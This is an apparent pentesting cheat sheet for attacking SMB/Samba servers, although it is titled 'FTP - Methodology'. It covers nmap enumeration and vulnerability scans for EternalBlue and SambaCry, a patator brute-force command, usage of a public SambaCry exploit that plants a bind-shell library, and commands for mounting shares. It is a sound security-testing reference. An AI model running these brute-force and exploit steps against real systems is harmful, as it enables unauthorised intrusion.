# FTP - Methodology

### RECON

###### Basic recon
The Nmap *smb-os-discovery.nse* script attempts to determine the operating system,
computer name, domain, workgroup, and current time over the SMB protocol.
```bash
nmap --script smb-os-discovery.nse -p 445 <IP>
nmap -sU -sS --script smb-os-discovery.nse -p U:137,T:139 <IP>
```

###### List accessible shares
List the shares available on the server from Linux using smbclient
```bash
smbclient -L <HOST>
smbclient -L <HOST> -U <USER>
```
Nmap can be used to list shares using the *smb-enum-shares.nse* script.
The script relies on the srvsvc.NetShareEnumAll MSRPC function and retrieve
more information using srvsvc.NetShareGetInfo.
If access to those functions is denied, a list of common share names are checked.
```bash
nmap --script smb-enum-shares.nse -p 445 <HOST>
nmap -sU -sS --script smb-enum-shares.nse -p U:137,T:139 <HOST>
```

###### Scan for EternalBlue & SambaCry
The Nmap *smb-vuln-ms17-010.nse* and *smb-vuln-cve-2017-7494* scripts attempt
to detect if a SMBv1 server is vulnerable to the remote code execution
vulnerability MS17-010, a.k.a. EternalBlue (vulnerability exploited by WannaCry
and Petya ransomware) or CVE-2017-7494 aka SambaCry.

```bash
# EternalBlue
nmap --script smb-vuln-ms17-010.nse -p 445 <IP>

# SambaCry
nmap --script smb-vuln-cve-2017-7494 -p 445 <IP>
nmap --script smb-vuln-cve-2017-7494 --script-args smb-vuln-cve-2017-7494.check-version -p445 <IP>
```

If no share is available to unauthenticated users, the server may still be
vulnerable for authenticated users, meaning finding credentials would lead to
RCE.  
The following versions are vulnerable:
```
# EternalBlue
https://docs.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010

# SambaCry
Samba 3.x after 3.5.0 and 4.x before 4.4.14, 4.5.x before 4.5.10, and 4.6.x before 4.6.4
```

### EXPLOITATION

###### Bruteforce

```bash
patator smb_login host=<IP> user=FILE0 password=FILE1 0=<wordlist_user> 1=<wordlist_password> -x ignore:mesg='NT_STATUS_LOGON_FAILURE'
```

###### EternalBlue

###### SambaCry
The following exploit may be used to achieve RCE through the SambaCry
vulnerability:
```bash
# Source
https://github.com/opsxcq/exploit-CVE-2017-7494

# Usage
exploit.py [-h] -t <TARGET> -e <EXECUTABLE> -s <REMOTESHARE> -r <REMOTEPATH> [-u <USER>] [-p <PASSWORD>] [-P <REMOTESHELLPORT>]

# The libbindshell-samba.so of the repository can be used to get a bind shell on the server :
# -e libbindshell-samba.so -r <SHARE>/libbindshell-samba.so
```

### POST EXPLOITATION

###### Connect from Linux
The *smbclient* utility tool can be used to connect to a share from Linux:
```bash
smbclient \\\\<HOST>\\<SHARE> -U <USER>
```
The share may also be mounted using the *mount* utility tool:
```bash
mount -t cifs -o username=<USER> //<HOST>//<SHARE> /mnt/<FOLDER>
mount -t cifs -o username=<USER>,password=<PASSWORD> //<HOST>//<SHARE> /mnt/<FOLDER>
```
